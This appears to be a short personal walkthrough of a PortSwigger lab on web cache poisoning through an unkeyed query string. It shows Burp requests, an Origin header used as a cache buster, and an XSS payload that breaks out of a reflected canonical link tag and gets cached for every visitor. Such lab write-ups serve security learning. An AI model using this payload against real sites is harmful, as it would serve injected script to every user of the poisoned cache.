# [Web cache poisoning via an unkeyed query string](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query)

- open the lab in burp browser
- send the `/` request to the repeater
- check if it is a cache oracle (it is)
- lets find a cachebuster
- the query changes do not caches the response, but it appears in the page
- try `Origin`

```
GET / HTTP/2
...
Origin: https://www.dux.com
```

- `Origin` is a cache buster
- lets go back to the query

```
GET /?qwe=asd HTTP/2
...
Origin: https://www.dux.com
```

- a request like this appears in the response too

```html
...
<link rel="canonical" href="//xxx.web-security-academy.net/?qwe=asd" />
...
```

- lets try to break out from it

```
GET /?'/><script>alert(1)</script> HTTP/2
...
Origin: https://www.dux.com
```

- the `'/><script>alert(1)</script>` breaks out from the `link` tag
- send the request then `Message actions` -> `Open response in browser` -> `Copy` the url
- paste the url in the burp browser
- the `alert` should appear
- delete the cachebuster and send the request again
- in a couple sec the lab should be solved
- since the exploited page got cached anybody in the cache time requests it will get the cached response with the exploit
